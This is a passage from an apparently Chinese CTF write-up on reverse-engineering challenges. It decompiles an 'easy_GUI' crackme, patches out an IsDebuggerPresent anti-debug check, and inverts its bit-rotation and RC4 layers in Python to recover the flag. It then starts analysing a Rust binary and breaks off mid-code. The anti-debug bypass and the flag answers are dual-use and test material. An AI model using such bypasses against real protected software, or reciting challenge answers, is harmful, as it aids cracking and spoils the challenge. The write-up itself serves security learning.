class="comment">//每组字符串的第3个字符</span></span><br><span class="line">    v13 = ((<span class="type">unsigned</span> __int8)Src[k] &gt;&gt; <span class="number">3</span>) | (<span class="number">32</span> * v11);	<span class="comment">//每组字符串的第1个字符右移3位与32倍的第4个字符进行按位或运算的值</span></span><br><span class="line">    v14 = <span class="number">32</span> * Src[k + <span class="number">1</span>];	<span class="comment">//32倍的每组字符串的第2个字符</span></span><br><span class="line">    Src[k + <span class="number">1</span>] = (<span class="number">32</span> * Src[k]) | ((<span class="type">unsigned</span> __int8)Src[k + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>);	<span class="comment">//每组字符串的第2个字符=32倍的第1个字符与第2个字符右移3位进行按位或运算的值</span></span><br><span class="line">    v15 = <span class="number">32</span> * v12;	<span class="comment">//32倍的每组字符串的第3个字符</span></span><br><span class="line">    Src[k + <span class="number">2</span>] = v14 | HIBYTE(v15);	<span class="comment">//每组字符串的第3个字符=32倍的第2个字符与32倍的第3个字符的高八位进行按位或运算的值</span></span><br><span class="line">    Src[k] = v13;	<span class="comment">//每组字符串的第1个字符=第1个字符右移3位与32倍的第4个字符进行按位或运算的值</span></span><br><span class="line">    Src[k + <span class="number">3</span>] = v15 | (v11 &gt;&gt; <span class="number">3</span>);	<span class="comment">//每组字符串的第4个字符=32倍的第3个字符与第4个字符右移3位进行按位或运算的值</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后改变v29：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">v16 = <span class="number">256</span>i64;</span><br><span class="line"><span class="built_in">strcpy</span>(v28, <span class="string">&quot;easy_GUI&quot;</span>);	<span class="comment">//v28 = [0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49]</span></span><br><span class="line">v17 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(v31, <span class="number">0</span>, <span class="keyword">sizeof</span>(v31));</span><br><span class="line">v18 = <span class="number">0</span>;</span><br><span class="line">v19 = <span class="number">0</span>i64;</span><br><span class="line"><span class="keyword">do</span>	<span class="comment">//256次循环</span></span><br><span class="line">&#123;</span><br><span class="line">  *((_BYTE *)v29 + v19) = v18;	<span class="comment">//将 v18 的值赋给 v29 数组的第 v19 个元素（最终效果是120317ECD0~120317EDCF为0~FF）</span></span><br><span class="line">  v20 = v18 &amp; <span class="number">7</span>;</span><br><span class="line">  ++v19;</span><br><span class="line">  ++v18;</span><br><span class="line">  Src[v19 + <span class="number">303</span>] = v28[v20];	<span class="comment">//将字符串 &quot;easy_GUI&quot; 的第 v20 个字符赋给 Src 数组的第 v19 + 303 个元素（最终效果是</span></span><br><span class="line">&#125;	<span class="comment">//120317EF00 ~120317EFFF均为easy_GUI的循环）</span></span><br><span class="line"><span class="keyword">while</span> ( v18 &lt; <span class="number">256</span> );</span><br><span class="line"></span><br><span class="line">v21 = <span class="number">0</span>i64;</span><br><span class="line"><span class="keyword">do</span>	<span class="comment">//256次循环，“Fisher-Yates 洗牌”或“RC4 密钥调度算法”的一部分</span></span><br><span class="line">&#123;</span><br><span class="line">  v22 = *((<span class="type">unsigned</span> __int8 *)v29 + v21);</span><br><span class="line">  v17 = (v22 + v31[v21] + v17) % <span class="number">256</span>;</span><br><span class="line">  v23 = (<span class="type">char</span> *)v29 + v17;</span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)*v23;</span><br><span class="line">  *((_BYTE *)v29 + v21++) = result;</span><br><span class="line">  *v23 = v22;</span><br><span class="line">  --v16;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v16 );</span><br></pre></td></tr></table></figure>
<p>最后再进行一次加密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v25 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( m = <span class="number">0</span>i64; m &lt; v7; ++m )							<span class="comment">//循环</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (v6 + <span class="number">1</span>) % <span class="number">256</span>;								<span class="comment">//v6++并取余256</span></span><br><span class="line">    v27 = *((<span class="type">unsigned</span> __int8 *)v29 + v6);						<span class="comment">//s盒中第v6个数的值</span></span><br><span class="line">    v25 = (v27 + v25) % <span class="number">256</span>;							<span class="comment">//v25每次循环的值v27 + v25取余256</span></span><br><span class="line">    *((_BYTE *)v29 + v6) = *((_BYTE *)v29 + v25);					<span class="comment">//RC4动态更新S盒</span></span><br><span class="line">    *((_BYTE *)v29 + v25) = v27;</span><br><span class="line">    Src[m] ^= *((_BYTE *)v29 + (<span class="type">unsigned</span> __int8)(v27 + *((_BYTE *)v29 + v6)));	<span class="comment">//v27 + v29[v6]生成一个索引，v29数组中该索引的值作为伪随机字节，与 Src[m] 进行异或操作</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int64)<span class="built_in">memcpy</span>(a3, Src, v7);				<span class="comment">//用 memcpy 将加密后的 Src 数组复制到 a3 指向的内存区域，并返回复制的字节数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现最后一次是以<code>easy_GUI</code>为key的RC4，第一次则是置换与位运算，进行动态调试发现失败，观察发现第94行有<font color=violet><strong>if ( !IsDebuggerPresent() )</strong></font>反调试，按照惯例将跳转的jz修改为jnz（74改75）处理后能正常运行，却发现输入框只能输入42个字符，于是在调试的时候修改数据补上两个，调试过程中发现的规律已经在上面的函数处进行注释.<br><br>下面先逆向第一次加密：由于第一次加密分两个小部分，先是把每个字符的值按10周期的循环加上<font color=lime><strong>[8, 25, A, 32, FE, E, 35, 37, E, FE]</strong></font>再强制转换为byte，那么这部分的逆向就很简单了，减回去就行，第二部分的位运算就比较复杂，先对反编译出来的函数进行化简（以4个字符为一个单元）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_step_1</span>(<span class="params">Src</span>):</span><br><span class="line">  old = Src</span><br><span class="line">  new = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">  new[<span class="number">0</span>] = ((old[<span class="number">3</span>] &lt;&lt; <span class="number">5</span>) | (old[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">  new[<span class="number">1</span>] = ((old[<span class="number">0</span>] &lt;&lt; <span class="number">5</span>) | (old[<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">  new[<span class="number">2</span>] = ((old[<span class="number">1</span>] &lt;&lt; <span class="number">5</span>) | (old[<span class="number">2</span>] &gt;&gt; <span class="number">3</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">  new[<span class="number">3</span>] = ((old[<span class="number">2</span>] &lt;&lt; <span class="number">5</span>) | (old[<span class="number">3</span>] &gt;&gt; <span class="number">3</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">  <span class="keyword">return</span> new</span><br></pre></td></tr></table></figure>
<p>也就是说正向过程为：<br><br>新的第一个&#x3D;旧的第四个的低三位在前+旧的第一个的高五位在后：new[0] &#x3D; ((old[3] &lt;&lt; 5) | (old[0] &gt;&gt; 3)) &amp; 0xFF<br><br>新的第二个&#x3D;旧的第一个的低三位在前+旧的第二个的高五位在后：new[1] &#x3D; ((old[0] &lt;&lt; 5) | (old[1] &gt;&gt; 3)) &amp; 0xFF<br><br>新的第三个&#x3D;旧的第二个的低三位在前+旧的第三个的高五位在后：new[2] &#x3D; ((old[1] &lt;&lt; 5) | (old[2] &gt;&gt; 3)) &amp; 0xFF<br><br>新的第四个&#x3D;旧的第三个的低三位在前+旧的第四个的高五位在后：new[3] &#x3D; ((old[2] &lt;&lt; 5) | (old[3] &gt;&gt; 3)) &amp; 0xFF<br><br><br>那么逆向过程就是：<br><br>旧的第一个&#x3D;新的第一个的低五位在前+新的第二个的高三位在后：old[0] &#x3D; ((new[0] &lt;&lt; 3) | (new[1] &gt;&gt; 5)) &amp; 0xFF<br><br>旧的第二个&#x3D;新的第二个的低五位在前+新的第三个的高三位在后：old[1] &#x3D; ((new[1] &lt;&lt; 3) | (new[2] &gt;&gt; 5)) &amp; 0xFF<br><br>旧的第三个&#x3D;新的第三个的低五位在前+新的第四个的高三位在后：old[2] &#x3D; ((new[2] &lt;&lt; 3) | (new[3] &gt;&gt; 5)) &amp; 0xFF<br><br>旧的第四个&#x3D;新的第四个的低五位在前+新的第一个的高三位在后：old[3] &#x3D; ((new[3] &lt;&lt; 3) | (new[0] &gt;&gt; 5)) &amp; 0xFF<br></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_step_or</span>(<span class="params">Src</span>):</span><br><span class="line">  new = Src</span><br><span class="line">  k = <span class="built_in">len</span>(Src) <span class="comment"># 列表的长度</span></span><br><span class="line">  old = [<span class="number">0</span>] * k <span class="comment"># 使old列表的长度为src的长度</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, k, <span class="number">4</span>): <span class="comment"># 逆向</span></span><br><span class="line">    old[i + <span class="number">0</span>] = ((new[i + <span class="number">0</span>] &lt;&lt; <span class="number">3</span>) | (new[i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    old[i + <span class="number">1</span>] = ((new[i + <span class="number">1</span>] &lt;&lt; <span class="number">3</span>) | (new[i + <span class="number">2</span>] &gt;&gt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    old[i + <span class="number">2</span>] = ((new[i + <span class="number">2</span>] &lt;&lt; <span class="number">3</span>) | (new[i + <span class="number">3</span>] &gt;&gt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">    old[i + <span class="number">3</span>] = ((new[i + <span class="number">3</span>] &lt;&lt; <span class="number">3</span>) | (new[i + <span class="number">0</span>] &gt;&gt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span></span><br><span class="line">  <span class="keyword">return</span> old</span><br></pre></td></tr></table></figure>
<p>再把最后一步进行逆向：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">v29 = [<span class="number">0x31</span>, <span class="number">0x74</span>, <span class="number">0x54</span>, <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x53</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x3a</span>, <span class="number">0x35</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0x04</span>, <span class="number">0x6b</span>, <span class="number">0x1f</span>, <span class="number">0x43</span>,</span><br><span class="line">       <span class="number">0x06</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x21</span>, <span class="number">0x08</span>, <span class="number">0x0b</span>, <span class="number">0x13</span>, <span class="number">0x52</span>, <span class="number">0x4b</span>, <span class="number">0x2f</span>, <span class="number">0x1a</span>, <span class="number">0x59</span>, <span class="number">0x2c</span>, <span class="number">0x56</span>, <span class="number">0x51</span>,</span><br><span class="line">       <span class="number">0x7f</span>, <span class="number">0x3b</span>, <span class="number">0x0e</span>, <span class="number">0x05</span>, <span class="number">0x26</span>, <span class="number">0x15</span>, <span class="number">0x25</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x7a</span>, <span class="number">0x3c</span>, <span class="number">0x29</span>, <span class="number">0x41</span>, <span class="number">0x2a</span>, <span class="number">0x12</span>, <span class="number">0x17</span>,</span><br><span class="line">       <span class="number">0x2e</span>, <span class="number">0x39</span>, <span class="number">0x57</span>, <span class="number">0x3d</span>, <span class="number">0x66</span>, <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x47</span>, <span class="number">0x16</span>, <span class="number">0x71</span>, <span class="number">0x5f</span>, <span class="number">0x1c</span>, <span class="number">0x14</span>, <span class="number">0x5a</span>,</span><br><span class="line">       <span class="number">0x0c</span>, <span class="number">0x4f</span>, <span class="number">0x01</span>, <span class="number">0x30</span>, <span class="number">0x1b</span>, <span class="number">0x68</span>, <span class="number">0x0f</span>, <span class="number">0x62</span>, <span class="number">0x3f</span>, <span class="number">0x18</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x7e</span>, <span class="number">0x5d</span>, <span class="number">0x6a</span>, <span class="number">0x28</span>,</span><br><span class="line">       <span class="number">0x22</span>, <span class="number">0x5b</span>, <span class="number">0x55</span>, <span class="number">0x72</span>, <span class="number">0x09</span>, <span class="number">0x5e</span>, <span class="number">0x02</span>, <span class="number">0x3e</span>, <span class="number">0x50</span>, <span class="number">0x7b</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x38</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x79</span>,</span><br><span class="line">       <span class="number">0x60</span>, <span class="number">0x36</span>, <span class="number">0x61</span>, <span class="number">0x6e</span>, <span class="number">0x2d</span>, <span class="number">0x49</span>, <span class="number">0x7c</span>, <span class="number">0x2b</span>, <span class="number">0x34</span>, <span class="number">0x27</span>, <span class="number">0x11</span>, <span class="number">0x7d</span>, <span class="number">0x0d</span>, <span class="number">0x0a</span>, <span class="number">0x77</span>, <span class="number">0x73</span>,</span><br><span class="line">       <span class="number">0x58</span>, <span class="number">0x5c</span>, <span class="number">0x4c</span>, <span class="number">0x32</span>, <span class="number">0x4d</span>, <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x40</span>, <span class="number">0x67</span>, <span class="number">0x4a</span>, <span class="number">0x4e</span>, <span class="number">0x1d</span>, <span class="number">0x07</span>, <span class="number">0x75</span>, <span class="number">0x19</span>, <span class="number">0x23</span>]</span><br><span class="line">re_v29 = [<span class="literal">None</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(v29):</span><br><span class="line">  re_v29[byte] = i</span><br><span class="line">Src = [<span class="number">0x7C</span>, <span class="number">0x0D</span>, <span class="number">0x36</span>, <span class="number">0x2B</span>, <span class="number">0x1D</span>, <span class="number">0x62</span>, <span class="number">0x5E</span>, <span class="number">0x3B</span>, <span class="number">0x79</span>, <span class="number">0x4C</span>, <span class="number">0x3D</span>, <span class="number">0x24</span>, <span class="number">0x3D</span>, <span class="number">0x55</span>, <span class="number">0x33</span>, <span class="number">0x49</span>, <span class="number">0x79</span>, <span class="number">0x3D</span>, <span class="number">0x77</span>, <span class="number">0x62</span>, <span class="number">0x39</span>, <span class="number">0x77</span>, <span class="number">0x3D</span>, <span class="number">0x49</span>, <span class="number">0x4C</span>, <span class="number">0x39</span>, <span class="number">0x77</span>, <span class="number">0x2B</span>, <span class="number">0x79</span>, <span class="number">0x27</span>, <span class="number">0x33</span>, <span class="number">0x79</span>, <span class="number">0x24</span>, <span class="number">0x3D</span>, <span class="number">0x4C</span>, <span class="number">0x4A</span>, <span class="number">0x79</span>, <span class="number">0x32</span>, <span class="number">0x39</span>, <span class="number">0x0A</span>, <span class="number">0x58</span>, <span class="number">0x0D</span>, <span class="number">0x3D</span>, <span class="number">0x75</span>]</span><br><span class="line">decrypted_Src = []</span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> Src:</span><br><span class="line">  decrypted_Src.append(re_v29[byte])</span><br><span class="line"><span class="built_in">print</span>([<span class="string">f&quot;0x<span class="subst">&#123;b:02X&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> decrypted_Src])</span><br><span class="line">decrypted_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> decrypted_Src)</span><br><span class="line"><span class="built_in">print</span>(decrypted_str)</span><br></pre></td></tr></table></figure>
<p>以上两个就是倒数第二、第一步的逆向（正向加密的第二、一步），后面的就是典型的以“easy_GUI”为key的RC4了，带入经过前两次加密的字符串<font color=lime><strong>C72AE7ACE6688D8DE8E5C72AE7ACE6688D8DE8E5C72AE7ACE6688D8DE8E5C72AE7ACE6688D8DE8E5C72A（1234567890*4+12）</strong></font>进行验证，在线网站和IDA上的输出相同，均为<font color=LimeGreen><strong>776c0c7d4428ceae38f3433a504cf98e4d50374a27f59dd8c02fb12c9b5ca9738e3d520c7e44149ff35c</strong></font>，验证通过，将原先的加密值<font color=yellow><strong>(DFC74D14C1EC08E45F3F03B4904AB98F8FFA7143C7F19DDD4FC012445C9D88362D161DEDBCEFBB5B9F77EB58)</strong></font>带入，解得<font color=orange><strong>[0x6f, 0x81, 0xa6, 0xc5, 0x63, 0xac, 0x4b, 0xc7, 0x8f, 0x29, 0x87, 0xa4, 0x27, 0xaa, 0xa6, 0x69, 0x4f, 0x27, 0xae, 0xec, 0x27, 0x2e, 0xe7, 0xa9, 0x69, 0x87, 0x2e, 0xe5, 0x2f, 0x24, 0xe6, 0x6f, 0x44, 0x87, 0xa9, 0x89, 0x4f, 0x26, 0x47, 0x21, 0xab, 0x01, 0xa7, 0xae]</strong></font>，再代入上面的两个逆向函数的倒数第二步，解得<font color=red><strong>[0x7C, 0x0D, 0x36, 0x2B, 0x1D, 0x62, 0x5E, 0x3B, 0x79, 0x4C, 0x3D, 0x24, 0x3D, 0x55, 0x33, 0x49, 0x79, 0x3D, 0x77, 0x62, 0x39, 0x77, 0x3D, 0x49, 0x4C, 0x39, 0x77, 0x2B, 0x79, 0x27, 0x33, 0x79, 0x24, 0x3D, 0x4C, 0x4A, 0x79, 0x32, 0x39, 0x0A, 0x58, 0x0D, 0x3D, 0x75]</strong></font>，再代入最后一步，解得<font color=violet><strong>[0x66, 0x6C, 0x61, 0x67, 0x7B, 0x47, 0x55, 0x21, 0x5F, 0x72, 0x33, 0x76, 0x33, 0x52, 0x35, 0x65, 0x5F, 0x33, 0x6E, 0x47, 0x31, 0x6E, 0x33, 0x65, 0x72, 0x31, 0x6E, 0x67, 0x5F, 0x69, 0x35, 0x5F, 0x76, 0x33, 0x72, 0x79, 0x5F, 0x73, 0x31, 0x6D, 0x70, 0x6C, 0x33, 0x7D]</strong></font>，即为<font color=deepskyblue><strong>flag{GU!_r3v3R5e_3nG1n3er1ng_i5_v3ry_s1mpl3}</strong></font>.</p>
<h3 id="ezrust："><a href="#ezrust：" class="headerlink" title="ezrust："></a>ezrust：</h3><p>发现函数多达543个，好在是windows程序，结合动态调试单步调试观察主要函数，首先是只有一行的main，返回的是<font color=red><strong>std::rt::lang_start::h55428494e2afd6bb((__int64)sub_7FF790BE4D20, argc, (__int64)argv, 0);</strong></font>，看起来很奇怪，main并没有直接包含程序基本运行逻辑，而是用<font color=red><strong>·std::rt::lang_start::h55428494e2afd6bb</strong></font>来执行，并且这个函数的第一个参数又是另一个函数<code>sub_7FF790BE4D20</code>的返回值，观察外部函数的反编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v2 = a1;	<span class="comment">//这里v2、a1就是sub_7FF790BE4D20的返回值</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">std</span>::rt::lang_start_internal::hc7b8e748e4342164((__int64)&amp;v2, (__int64)&amp;unk_7FF790BFF548);</span><br></pre></td></tr></table></figure>
<p>发现又嵌套了一层，而<code>&amp;unk_7FF790BFF548</code>是一个除了第九项为8之外其他项全为0的24项的数组，再看这个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="built_in">std</span>::rt::lang_start_internal::hc7b8e748e4342164(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentThread; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5[<span class="number">3</span>]; <span class="comment">// [rsp+30h] [rbp-50h] BYREF</span></span><br><span class="line">  ULONG StackSizeInBytes[<span class="number">2</span>]; <span class="comment">// [rsp+48h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+80h] [rbp+0h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+98h] [rbp+18h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+A0h] [rbp+20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+A8h] [rbp+28h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">-2</span>i64;</span><br><span class="line">  v9 = a2; <span class="comment">//v10 = -2，v9 = unk，v8 = sub的返回值</span></span><br><span class="line">  v8 = a1;</span><br><span class="line">  AddVectoredExceptionHandler(<span class="number">0</span>, <span class="built_in">std</span>::sys::pal::windows::stack_overflow::vectored_handler);</span><br><span class="line">  StackSizeInBytes[<span class="number">0</span>] = <span class="number">20480</span>;</span><br><span class="line">  SetThreadStackGuarantee(StackSizeInBytes);</span><br><span class="line">  CurrentThread = GetCurrentThread();</span><br><span class="line">  off_7FF790C0B030(CurrentThread, <span class="string">L&quot;main&quot;</span>);</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v3 = <span class="built_in">std</span>::thread::Thread::new_inner(v5);</span><br><span class="line">  <span class="built_in">std</span>::thread::set_current::h851718f917992fcb(v3);</span><br><span class="line">  result = (*(<span class="type">int</span> (__fastcall **)(__int64))(v9 + <span class="number">40</span>))(v8);</span><br><span class="line">  <span class="keyword">if</span> ( qword_7FF790C0B148 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = result;</span><br><span class="line">    LOBYTE(v7) = <span class="number">1</span>;</span><br><span class="line">    *(_QWORD *)StackSizeInBytes = &amp;v7;</span><br><span class="line">    <span class="built_in">std</span>::sys::sync::once::<span class="built_in">queue</span>::Once::call::h028ada4c67e00e11(</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;qword_7FF790C0B148,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)StackSizeInBytes,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_7FF790C01018,</span><br><span class="line">      (__int64)&amp;off_7FF790C00440);</span><br><span class="line">    <span class="keyword">return</span> v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现了很多名称很长又极其丑陋的函数，过于复杂，而且貌似和核心程序并没有什么关系（毕竟正常运行时弹出的“请输入要比较的字符串：”和经典的比较函数以及加密的flag字符串貌似在这里都找不到），转换角度观察其第一个参数<code>sub_7FF790BE4D20</code>这个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_7FF790BE4D20</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">...声明变量省略...</span><br><span class="line">  v19[<span class="number">1</span>] = <span class="number">-2</span>i64;</span><br><span class="line">  v6 = (_BYTE *)sub_7FF790BE3240(<span class="number">26</span>i64, <span class="number">1</span>i64);</span><br><span class="line">  *v6 = <span class="number">18</span>;</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">31</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">20</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">21</span>;</span><br><span class="line">  v6[<span class="number">4</span>] = <span class="number">30</span>;</span><br><span class="line">  v6[<span class="number">5</span>] = <span class="number">15</span>;</span><br><span class="line">  v6[<span class="number">6</span>] = <span class="number">95</span>;</span><br><span class="line">  v6[<span class="number">7</span>] = <span class="number">57</span>;</span><br><span class="line">  v6[<span class="number">8</span>] = <span class="number">43</span>;</span><br><span class="line">  v6[<span class="number">9</span>] = <span class="number">51</span>;</span><br><span class="line">  v6[<span class="number">10</span>] = <span class="number">7</span>;</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="number">65</span>;</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="number">58</span>;</span><br><span class="line">  v6[<span class="number">13</span>] = <span class="number">79</span>;</span><br><span class="line">  v6[<span class="number">14</span>] = <span class="number">95</span>;</span><br><span class="line">  v6[<span class="number">15</span>] = <span class="number">3</span>;</span><br><span class="line">  v6[<span class="number">16</span>] = <span class="number">16</span>;</span><br><span class="line">  v6[<span class="number">17</span>] = <span class="number">44</span>;</span><br><span class="line">  v6[<span class="number">18</span>] = <span class="number">53</span>;</span><br><span class="line">  v6[<span class="number">19</span>] = <span class="number">6</span>;</span><br><span class="line">  v6[<span class="number">20</span>] = <span class="number">58</span>;</span><br><span class="line">  v6[<span class="number">21</span>] = <span class="number">4</span>;</span><br><span class="line">  v6[<span class="number">22</span>] = <span class="number">26</span>;</span><br><span class="line">  v6[<span class="number">23</span>] = <span class="number">31</span>;</span><br><span class="line">  v6[<span class="number">24</span>] = <span class="number">0</span>;</span><br><span class="line">  v6[<span 